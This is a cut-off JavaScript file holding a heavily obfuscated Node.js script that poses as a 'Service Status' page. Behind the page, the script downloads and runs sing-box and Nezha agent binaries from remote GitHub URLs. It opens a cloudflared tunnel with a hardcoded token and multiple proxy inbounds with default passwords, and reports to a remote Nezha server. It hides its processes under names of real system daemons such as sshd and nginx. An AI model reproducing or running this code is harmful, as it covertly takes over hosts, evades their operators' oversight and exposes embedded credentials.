const b = 'const _0x4c21a7=_0x5628;function _0x5628(_0x2679e7,_0x1bd99b){const _0x1ec90a=_0x1ec9();return _0x5628=function(_0x56280e,_0x447c41){_0x56280e=_0x56280e-0xf4;let _0x323039=_0x1ec90a[_0x56280e];return _0x323039;},_0x5628(_0x2679e7,_0x1bd99b);}(function(_0x2d40c4,_0x2161ea){const _0x170780=_0x5628,_0x438742=_0x2d40c4();while(!![]){try{const _0x2bd8c3=-parseInt(_0x170780(0x156))/0x1+parseInt(_0x170780(0x102))/0x2*(-parseInt(_0x170780(0x1b8))/0x3)+parseInt(_0x170780(0x195))/0x4+parseInt(_0x170780(0x1bc))/0x5+-parseInt(_0x170780(0x1c2))/0x6*(-parseInt(_0x170780(0x133))/0x7)+parseInt(_0x170780(0x1af))/0x8*(parseInt(_0x170780(0x104))/0x9)+-parseInt(_0x170780(0x132))/0xa;if(_0x2bd8c3===_0x2161ea)break;else _0x438742['push'](_0x438742['shift']());}catch(_0x4d51a2){_0x438742['push'](_0x438742['shift']());}}}(_0x1ec9,0xa77de));const http=require('http'),https=require(_0x4c21a7(0x170)),fs=require('fs'),path=require(_0x4c21a7(0x1a9)),os=require('os'),{spawn,exec}=require(_0x4c21a7(0x1ba)),{URL}=require('url'),crypto=require(_0x4c21a7(0x1a7)),net=require(_0x4c21a7(0x14f)),express=require('express'),{createProxyMiddleware}=require(_0x4c21a7(0x1b2)),axios=require(_0x4c21a7(0x194)),CONFIG={'C_T':process[_0x4c21a7(0x16c)][_0x4c21a7(0x1a1)]||_0x4c21a7(0x1c3),'B_D':process[_0x4c21a7(0x16c)][_0x4c21a7(0x1b0)]||_0x4c21a7(0x1ad),'C_D':process[_0x4c21a7(0x16c)][_0x4c21a7(0xff)]||_0x4c21a7(0x128),'N_S':process[_0x4c21a7(0x16c)]['N_S']||'nz.seav.eu.org','N_P':process[_0x4c21a7(0x16c)]['N_P']||_0x4c21a7(0x11a),'N_K':process['env'][_0x4c21a7(0x1a0)]||_0x4c21a7(0x19e),'N_T':process[_0x4c21a7(0x16c)][_0x4c21a7(0x1bb)]||_0x4c21a7(0x112),'HY2_PORT':process[_0x4c21a7(0x16c)][_0x4c21a7(0x13e)]||process[_0x4c21a7(0x16c)][_0x4c21a7(0x110)]||'','VMESS_PORT':process[_0x4c21a7(0x16c)][_0x4c21a7(0x152)]||_0x4c21a7(0x10d),'REALITY_PORT':process[_0x4c21a7(0x16c)][_0x4c21a7(0x17c)]||'','TUIC_PORT':process[_0x4c21a7(0x16c)][_0x4c21a7(0x139)]||'','SERVER_IP':process[_0x4c21a7(0x16c)][_0x4c21a7(0x185)]||'','VMESS_UUID':process[_0x4c21a7(0x16c)]['VMESS_UUID']||_0x4c21a7(0x19f),'TUIC_UUID':process[_0x4c21a7(0x16c)][_0x4c21a7(0x105)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_PASSWORD':process[_0x4c21a7(0x16c)]['TUIC_PASSWORD']||_0x4c21a7(0x158),'HY2_PASSWORD':process[_0x4c21a7(0x16c)][_0x4c21a7(0x12c)]||'789456','REALITY_PRIVATE_KEY':process[_0x4c21a7(0x16c)][_0x4c21a7(0x108)]||'','REALITY_PUBLIC_KEY':process[_0x4c21a7(0x16c)][_0x4c21a7(0x17d)]||'','HY2_SNI':process[_0x4c21a7(0x16c)]['HY2_SNI']||_0x4c21a7(0xfc),'VMESS_PATH':process[_0x4c21a7(0x16c)][_0x4c21a7(0x114)]||_0x4c21a7(0x14a),'REALITY_SNI':process[_0x4c21a7(0x16c)][_0x4c21a7(0x184)]||'www.microsoft.com','REALITY_SHORT_ID':process[_0x4c21a7(0x16c)][_0x4c21a7(0xf6)]||_0x4c21a7(0x196),'PORT':process['env'][_0x4c21a7(0x117)]||0xbb8},WORK_DIR=os[_0x4c21a7(0x166)](),processes=[];let serviceStatus={'singbox':_0x4c21a7(0x1b6),'cloudflared':'stopped','nezha':_0x4c21a7(0x1b6),'http':'stopped'};const HTML_TEMPLATES={'home':_0x4c21a7(0x17b),'status':(_0x11b5b6,_0x138536)=>_0x4c21a7(0x148)+(serviceStatus['singbox']==='running'?'status-running':_0x4c21a7(0x129))+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+serviceStatus['singbox']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus['cloudflared']===_0x4c21a7(0x18e)?_0x4c21a7(0x199):'status-stopped')+_0x4c21a7(0x106)+serviceStatus['cloudflared']+_0x4c21a7(0x1aa)+(serviceStatus[_0x4c21a7(0x16a)]===_0x4c21a7(0x18e)?_0x4c21a7(0x199):_0x4c21a7(0x129))+_0x4c21a7(0x17f)+serviceStatus[_0x4c21a7(0x16a)]+_0x4c21a7(0x1aa)+(serviceStatus[_0x4c21a7(0x15d)]===_0x4c21a7(0x18e)?_0x4c21a7(0x199):_0x4c21a7(0x129))+_0x4c21a7(0x15b)+serviceStatus[_0x4c21a7(0x15d)]+_0x4c21a7(0x13f)+CONFIG['PORT']+'</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG[_0x4c21a7(0x152)]?_0x4c21a7(0x13c)+CONFIG[_0x4c21a7(0x152)]+_0x4c21a7(0x14c):'')+_0x4c21a7(0x1ac)+(CONFIG[_0x4c21a7(0x13e)]?_0x4c21a7(0x150)+CONFIG['HY2_PORT']+_0x4c21a7(0x14c):'')+_0x4c21a7(0x1ac)+(CONFIG[_0x4c21a7(0x17c)]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x4c21a7(0x17c)]+_0x4c21a7(0x14c):'')+_0x4c21a7(0x1ac)+(CONFIG[_0x4c21a7(0x139)]?_0x4c21a7(0x198)+CONFIG[_0x4c21a7(0x139)]+'</div></div>':'')+_0x4c21a7(0x155)+_0x11b5b6+_0x4c21a7(0x1bd)+(_0x138536[_0x4c21a7(0x176)]>0x0?_0x138536[_0x4c21a7(0x1ae)](_0x1d2b18=>_0x4c21a7(0x115)+_0x1d2b18[_0x4c21a7(0x190)]+':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22'+_0x1d2b18['protocol']['toLowerCase']()+'\x22>'+_0x1d2b18[_0x4c21a7(0x18b)]+_0x4c21a7(0x137)+_0x1d2b18[_0x4c21a7(0x18b)]+_0x4c21a7(0x14b)+_0x1d2b18['protocol']+'!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20')[_0x4c21a7(0x1a6)](''):_0x4c21a7(0x1a3))+_0x4c21a7(0x161)},COMMON_PROCESS_NAMES=[_0x4c21a7(0x1b5),_0x4c21a7(0x192),'apache2',_0x4c21a7(0x149),_0x4c21a7(0x13b),_0x4c21a7(0xf4),_0x4c21a7(0x18d),'memcached',_0x4c21a7(0x181),_0x4c21a7(0x1b1),'crond',_0x4c21a7(0x1a2),'supervisord',_0x4c21a7(0x15e),_0x4c21a7(0x11e),_0x4c21a7(0x19b),_0x4c21a7(0x165),_0x4c21a7(0x134),'mongod',_0x4c21a7(0x126),_0x4c21a7(0x1a4),_0x4c21a7(0x12f),'logrotate',_0x4c21a7(0x113),'syslogd','dbus-daemon',_0x4c21a7(0x187),'atd','dhclient','polkitd',_0x4c21a7(0x140)];function getRandomProcessName(){const _0x499d32=_0x4c21a7;return COMMON_PROCESS_NAMES[Math['floor'](Math[_0x499d32(0x124)]()*COMMON_PROCESS_NAMES[_0x499d32(0x176)])];}function detectArch(){const _0x2619c0=_0x4c21a7,_0x2f9924=process['arch'];return _0x2f9924===_0x2619c0(0x138)?_0x2619c0(0x177):_0x2f9924===_0x2619c0(0xf5)?_0x2619c0(0xf5):(process[_0x2619c0(0x10c)](0x1),'');}async function downloadBinary(_0x74988b,_0x25751c){const _0x1be8ff=_0x4c21a7;try{const _0x2617f9=await axios({'method':'GET','url':_0x74988b,'responseType':_0x1be8ff(0x14d)}),_0x44f26b=fs['createWriteStream'](_0x25751c);return _0x2617f9['data'][_0x1be8ff(0x189)](_0x44f26b),new Promise((_0x595d34,_0xfec1f7)=>{const _0x160fdc=_0x1be8ff;_0x44f26b['on'](_0x160fdc(0x18a),()=>{const _0x486fa2=_0x160fdc;fs[_0x486fa2(0x159)](_0x25751c,0x1ed),_0x595d34();}),_0x44f26b['on'](_0x160fdc(0x1b4),_0xfec1f7);});}catch(_0x3612f7){throw _0x3612f7;}}async function getServerIP(){const _0x450a35=_0x4c21a7;try{const _0x40486e=await axios[_0x450a35(0x167)](_0x450a35(0x168));return _0x40486e['data']['trim']();}catch(_0x1727f7){return _0x450a35(0x15a);}}async function startTempTunnel(_0x5a49ed,_0x3cc2f0){return new Promise(_0x4a5083=>{const _0xb1193f=_0x5628;for(let _0x1ae530=0x0;_0x1ae530<0x3;_0x1ae530++){const _0x20ecdd=path['join'](WORK_DIR,_0xb1193f(0x178)+crypto[_0xb1193f(0x111)](0x4)[_0xb1193f(0x11f)](_0xb1193f(0x147))+_0xb1193f(0xfd)),_0x1b9c6c=spawn(_0x5a49ed,[_0xb1193f(0x157),_0xb1193f(0x162),'--url',_0xb1193f(0x109)+_0x3cc2f0],{'stdio':[_0xb1193f(0x146),_0xb1193f(0x189),_0xb1193f(0x189)]});processes[_0xb1193f(0x1b3)](_0x1b9c6c);const _0x2096bb=fs['createWriteStream'](_0x20ecdd);_0x1b9c6c['stdout'][_0xb1193f(0x189)](_0x2096bb),_0x1b9c6c['stderr'][_0xb1193f(0x189)](_0x2096bb),serviceStatus[_0xb1193f(0x160)]=_0xb1193f(0x18e),_0x1b9c6c['on'](_0xb1193f(0x1b4),()=>{const _0x45647c=_0xb1193f;serviceStatus[_0x45647c(0x160)]='error';}),_0x1b9c6c['on'](_0xb1193f(0x10c),_0x48e65e=>{const _0x4b0a1a=_0xb1193f;_0x48e65e!==0x0&&(serviceStatus['cloudflared']=_0x4b0a1a(0x1b6));}),setTimeout(()=>{const _0x7ebb77=_0xb1193f;try{const _0x26a9da=fs[_0x7ebb77(0x119)](_0x20ecdd,'utf8'),_0x391857=_0x26a9da['match'](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x391857){CONFIG[_0x7ebb77(0xff)]=_0x391857[0x1];try{fs['unlinkSync'](_0x20ecdd);}catch(_0x30d37f){}return _0x4a5083(!![]);}}catch(_0xd4a2ea){}_0x1b9c6c['kill']();try{fs[_0x7ebb77(0x193)](_0x20ecdd);}catch(_0x281782){}_0x1ae530===0x2&&(serviceStatus[_0x7ebb77(0x160)]=_0x7ebb77(0x1b4),_0x4a5083(![]));},0x2710);}});}async function generateRealityKeys(_0x2f016b){const _0x282d95=_0x4c21a7;if(!CONFIG[_0x282d95(0x17c)]||CONFIG[_0x282d95(0x108)]&&CONFIG[_0x282d95(0x17d)])return;return new Promise(_0x1214fe=>{exec('\x22'+_0x2f016b+'\x22\x20generate\x20reality-keypair',(_0x13a063,_0x19bee6)=>{const _0x5ccd38=_0x5628;if(!_0x13a063&&_0x19bee6){const _0x28f6bf=_0x19bee6['match'](/PrivateKey:\s*(\S+)/),_0x3a9391=_0x19bee6[_0x5ccd38(0x1a5)](/PublicKey:\s*(\S+)/);_0x28f6bf&&_0x3a9391&&(CONFIG[_0x5ccd38(0x108)]=_0x28f6bf[0x1],CONFIG[_0x5ccd38(0x17d)]=_0x3a9391[0x1]);}_0x1214fe();});});}async function generateSingBoxConfig(){const _0x5020f7=_0x4c21a7,_0x4e7794=[];CONFIG[_0x5020f7(0x13e)]&&_0x4e7794['push']({'type':'hysteria2','tag':_0x5020f7(0xfe),'listen':'0.0.0.0','listen_port':parseInt(CONFIG[_0x5020f7(0x13e)]),'users':[{'password':CONFIG[_0x5020f7(0x12c)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x5020f7(0x12b)],'insecure':!![],'alpn':['h3']}});CONFIG[_0x5020f7(0x152)]&&_0x4e7794[_0x5020f7(0x1b3)]({'type':_0x5020f7(0x175),'tag':_0x5020f7(0x188),'listen':_0x5020f7(0x180),'listen_port':parseInt(CONFIG[_0x5020f7(0x152)]),'users':[{'uuid':CONFIG['VMESS_UUID'],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x5020f7(0x114)],'headers':{}}});CONFIG[_0x5020f7(0x17c)]&&_0x4e7794['push']({'type':'vless','tag':_0x5020f7(0x10f),'listen':_0x5020f7(0x180),'listen_port':parseInt(CONFIG[_0x5020f7(0x17c)]),'users':[{'uuid':CONFIG[_0x5020f7(0x16f)],'flow':'xtls-rprx-vision'}],'tls':{'enabled':!![],'server_name':CONFIG[_0x5020f7(0x184)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x5020f7(0x184)],'server_port':0x1bb},'private_key':CONFIG[_0x5020f7(0x108)],'short_id':[CONFIG[_0x5020f7(0xf6)]]}}});CONFIG[_0x5020f7(0x139)]&&_0x4e7794['push']({'type':_0x5020f7(0x1c0),'tag':_0x5020f7(0x14e),'listen':_0x5020f7(0x180),'listen_port':parseInt(CONFIG['TUIC_PORT']),'users':[{'uuid':CONFIG['TUIC_UUID'],'password':CONFIG['TUIC_PASSWORD']}],'congestion_control':_0x5020f7(0x127),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x5020f7(0x19d),'tls':{'enabled':!![],'server_name':CONFIG[_0x5020f7(0x12b)],'insecure':!![],'alpn':['h3']}});const _0x463f62={'log':{'level':_0x5020f7(0x17e),'timestamp':!![]},'dns':{'servers':[{'tag':_0x5020f7(0x151),'address':_0x5020f7(0x10b)},{'tag':'cloudflare','address':_0x5020f7(0x16e)}],'final':_0x5020f7(0x151)},'inbounds':_0x4e7794,'outbounds':[{'type':'direct','tag':'direct'},{'type':_0x5020f7(0x10a),'tag':'block'}],'route':{'rules':[{'ip_is_private':!![],'outbound':_0x5020f7(0xf8)}],'final':_0x5020f7(0xf8)},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x5020f7(0x1a6)](WORK_DIR,_0x5020f7(0x1a8))}}},_0x3d5cda=path[_0x5020f7(0x1a6)](WORK_DIR,_0x5020f7(0x172));return fs[_0x5020f7(0xf9)](_0x3d5cda,JSON['stringify'](_0x463f62,null,0x2)),_0x3d5cda;}function generateLinks(_0x102563){const _0x30b0ac=_0x4c21a7,_0xdbca9c=[];CONFIG[_0x30b0ac(0x13e)]&&_0xdbca9c[_0x30b0ac(0x1b3)]({'protocol':_0x30b0ac(0x131),'url':'hysteria2://'+CONFIG['HY2_PASSWORD']+'@'+_0x102563+':'+CONFIG['HY2_PORT']+'?insecure=1&sni='+CONFIG[_0x30b0ac(0x12b)]+_0x30b0ac(0x1b7)});if(CONFIG[_0x30b0ac(0x152)]){const _0x35267e={'v':'2','ps':_0x30b0ac(0x135),'add':CONFIG[_0x30b0ac(0x1b0)],'port':_0x30b0ac(0x11a),'id':CONFIG[_0x30b0ac(0x16f)],'aid':'0','scy':'auto','net':'ws','type':_0x30b0ac(0x11d),'host':CONFIG[_0x30b0ac(0xff)],'path':CONFIG[_0x30b0ac(0x114)],'tls':_0x30b0ac(0x15c),'sni':CONFIG[_0x30b0ac(0xff)],'alpn':'','fp':_0x30b0ac(0x19a)};_0xdbca9c[_0x30b0ac(0x1b3)]({'protocol':_0x30b0ac(0x18f),'url':_0x30b0ac(0x121)+Buffer[_0x30b0ac(0x122)](JSON[_0x30b0ac(0x179)](_0x35267e))[_0x30b0ac(0x11f)](_0x30b0ac(0x182))});}return CONFIG['REALITY_PORT']&&_0xdbca9c[_0x30b0ac(0x1b3)]({'protocol':_0x30b0ac(0x173),'url':_0x30b0ac(0x13a)+CONFIG[_0x30b0ac(0x16f)]+'@'+_0x102563+':'+CONFIG[_0x30b0ac(0x17c)]+'?encryption=none&flow=xtls-rprx-vision&security=reality&sni='+CONFIG[_0x30b0ac(0x184)]+_0x30b0ac(0x12d)+CONFIG[_0x30b0ac(0x17d)]+_0x30b0ac(0x118)+CONFIG[_0x30b0ac(0xf6)]+'&type=tcp#REALITY'}),CONFIG['TUIC_PORT']&&_0xdbca9c['push']({'protocol':_0x30b0ac(0x171),'url':_0x30b0ac(0x15f)+CONFIG[_0x30b0ac(0x105)]+':'+CONFIG[_0x30b0ac(0x13d)]+'@'+_0x102563+':'+CONFIG[_0x30b0ac(0x139)]+_0x30b0ac(0x18c)}),_0xdbca9c;}function _0x1ec9(){const _0x189a35=['6QxwQRv','some','child_process','N_T','2168460oLQMNh','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','--token','createWriteStream','tuic','stderr','78drdcas','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNWI0ZDc2ZDItYmY3Mi00YjRiLTg0MTUtNTkyN2JhMjZmMDE5IiwicyI6IlpEUmlNalEzTW1NdFpqUXhaUzAwTW1FMkxXSmpOV0l0TVdKak1EWmpZV1l6Wm1FMyJ9','postgres','arm64','REALITY_SHORT_ID','文件未找到:\x20','direct','writeFileSync','toLowerCase','ws://localhost:','www.bing.com','.log','hy2-in','C_D','https://github.com/seav1/dl/releases/download/upx/nz','home','624222sjGixV','existsSync','72018VSTdHv','TUIC_UUID','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','keys','REALITY_PRIVATE_KEY','http://localhost:','block','8.8.8.8','exit','8001','--edge-ip-version','reality-in','SERVER_PORT','randomBytes','--tls','udevd','VMESS_PATH','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','find','PORT','&sid=','readFileSync','443','https://github.com/seav1/dl/releases/download/upx/nz-arm','N_P','none','python','toString','catch','vmess://','from','--disable-auto-update','random','/status','dockerd','cubic','crosmo.seav.eu.org','status-stopped','--protocol','HY2_SNI','HY2_PASSWORD','&fp=chrome&pbk=','https://github.com/seav1/dl/releases/download/upx/sb-arm','snapd','writeHead','Hysteria2','15608790XgoLCK','543067tweMrH','ruby','VMESS','status','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','x64','TUIC_PORT','vless://','mysqld','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','TUIC_PASSWORD','HY2_PORT','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>','irqbalance','end','forEach','application/json','https://github.com/seav1/dl/releases/download/upx/sb','--report-delay','ignore','hex','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','httpd','/vms','\x27).then(()=>alert(\x27Copied\x20','</div></div>','stream','tuic-in','net','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','google','VMESS_PORT','spawn','/health','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','1020894RbyrNU','tunnel','789456','chmodSync','127.0.0.1','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','tls','http','node','tuic://','cloudflared','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','--no-autoupdate','SIGTERM','killed','java','tmpdir','get','https://ipv4.icanhazip.com','\x22\x20check\x20-c\x20\x22','nezha','text/html','env','r